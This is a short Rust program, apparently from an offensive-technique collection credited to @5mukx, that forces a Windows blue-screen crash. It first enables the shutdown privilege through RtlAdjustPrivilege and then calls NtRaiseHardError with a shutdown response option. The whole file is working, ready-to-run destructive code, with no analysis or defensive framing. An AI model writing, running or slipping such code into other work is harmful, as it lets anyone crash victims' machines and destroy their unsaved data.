/*
    BSOD using RtlAdjustPrivilege and NtRaiseHardError.
    @5mukx
*/

extern crate libc;
use std::ptr;

#[link(name = "ntdll")]
extern "system" {
    fn RtlAdjustPrivilege(
        Privilege: i32,
        bEnablePrivilege: bool,
        IsThreadPrivilege: bool,
        PreviousValue: *mut bool,
    ) -> u32;

    fn NtRaiseHardError(
        ErrorStatus: u32,
        NumberOfParameters: u32,
        UnicodeStringParameterMask: u32,
        Parameters: *const libc::c_void,
        ValidResponseOption: u32,
        Response: *mut u32,
    ) -> u32;
}

fn main(){
    unsafe{
        RtlAdjustPrivilege(
            19, 
            true, 
            false, 
            &mut false,
        );

        NtRaiseHardError(
            0xc0000022, 
            0, 
            0, 
            ptr::null(), 
            6, 
            &mut 0,
        );

    }
}
